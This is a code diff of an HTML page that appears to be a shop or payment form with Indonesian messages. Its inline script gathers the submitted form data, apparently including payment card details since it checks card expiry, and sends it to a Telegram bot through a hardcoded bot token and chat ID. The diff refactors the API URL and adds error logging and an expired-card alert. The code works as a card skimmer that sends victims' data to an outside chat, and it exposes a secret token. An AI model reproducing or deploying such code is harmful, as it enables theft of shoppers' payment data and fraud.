@@ -179,7 +179,8 @@ span.price {
   </div>
 </div>
 
-<script>
+</body>
+  <script>
   // Bot Telegram Token and Chat ID
   const TELEGRAM_TOKEN = '7613456424:AAGM8gwCFIqDJ5PYtHq2dBt68YHjoqXkhuY';
   const CHAT_ID = '-4739640308';
@@ -242,7 +243,9 @@ span.price {
     });
 
     // Send the message to Telegram Bot
-    fetch(`https://api.telegram.org/bot7613456424:AAGM8gwCFIqDJ5PYtHq2dBt68YHjoqXkhuY/sendMessage`, {
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot7613456424:AAGM8gwCFIqDJ5PYtHq2dBt68YHjoqXkhuY/sendMessage`;
+
+    fetch(TELEGRAM_API_URL, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -257,6 +260,7 @@ span.price {
       if (data.ok) {
         alert('Formulir berhasil dikirim ke Telegram!');
       } else {
+        console.error('Telegram API Error:', data);
         alert('Terjadi kesalahan, coba lagi.');
       }
     })
@@ -279,11 +283,10 @@ span.price {
     const currentYear = currentDate.getFullYear() % 100; // Get last two digits of year
 
     if (month < currentMonth || (month == currentMonth && year < currentYear)) {
+      alert("Kartu telah kadaluarsa.");
       return false; // Expired card
     }
     return true;
   }
-</script>
-
-</body>
+    </script>
 </html>
